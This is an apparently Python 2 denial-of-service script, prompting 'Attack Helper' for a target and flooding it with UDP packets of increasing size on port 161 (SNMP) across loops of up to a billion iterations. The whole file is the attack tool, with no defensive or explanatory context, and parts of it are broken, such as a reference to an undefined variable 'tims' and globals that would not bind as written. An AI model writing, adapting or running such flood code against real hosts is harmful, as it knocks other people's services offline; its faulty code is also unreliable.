#-*-coding:cp1254-*-

import socket
import time
import os

class datacolins:
    sunucu = raw_input("Attack Helper >>")
    byte = 1024
    bit = bytearray(1000000)
    message = buffer(bit,50,byte)
    times = time.time()
    global sunucu,byte,message,bit
datacolins = datacolins()

def attack():
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    host = sunucu
    port = 161
    s.connect((host,port))
    ip = socket.gethostbyname(host)
    s.sendto(message,(ip,port))
    s.close()

for i in xrange(10):
        byte += 1024
        print "Byte :",byte
        attack()
print "Socket completing ..."
time.sleep(5)

for a in xrange(100):
    byte += 1024
    message= buffer(bit,100,byte)
    print "Byte :",byte
    attack()
print "Socket completing ..."
time.sleep(5)

for b in xrange(1000):
    byte += 1024
    message= buffer(bit,150,byte)
    print "Byte :",byte
    attack()
    
print "Socket completing ..."
time.sleep(5)

for c in xrange(10000):
    byte += 1024
    message= buffer(bit,200,byte)
    print "Byte :",byte
    attack()
print "Socket completing ..."
time.sleep(5)

for d in xrange(100000):
    byte += 1024
    message= buffer(bit,250,byte)
    print "Byte :",byte
    attack()
    
print "Socket completing ..."
time.sleep(20)

for e in xrange(1000000):
    byte += 1024
    message= buffer(bit,300,byte)
    print "Byte :",byte
    attack()
print "Socket completing ..."
time.sleep(20)

for f in range(1,10000000,5):
    byte += 1024
    message= buffer(bit,350,byte)
    print "Byte :",byte
    attack()
print "Socket completing ..."
time.sleep(20)

for g in range(1,100000000,10):
    byte += 1024
    message= buffer(bit,400,byte)
    print "Byte :",byte
    attack()
print "Socket completing ..."
time.sleep(20)

for h in range(1,100000000,15):
    byte += 1024
    message= buffer(bit,450,byte)
    print "byte :",byte
    attack()
print "Socket completing ..."
time.sleep(20)
for j in range(1,1000000000,20):
    byte += 1024
    message= buffer(bit,500,byte)
    print "byte :", byte
    attack()

Last = time.time() - tims
print int(Last)
#wrote by Pyton2
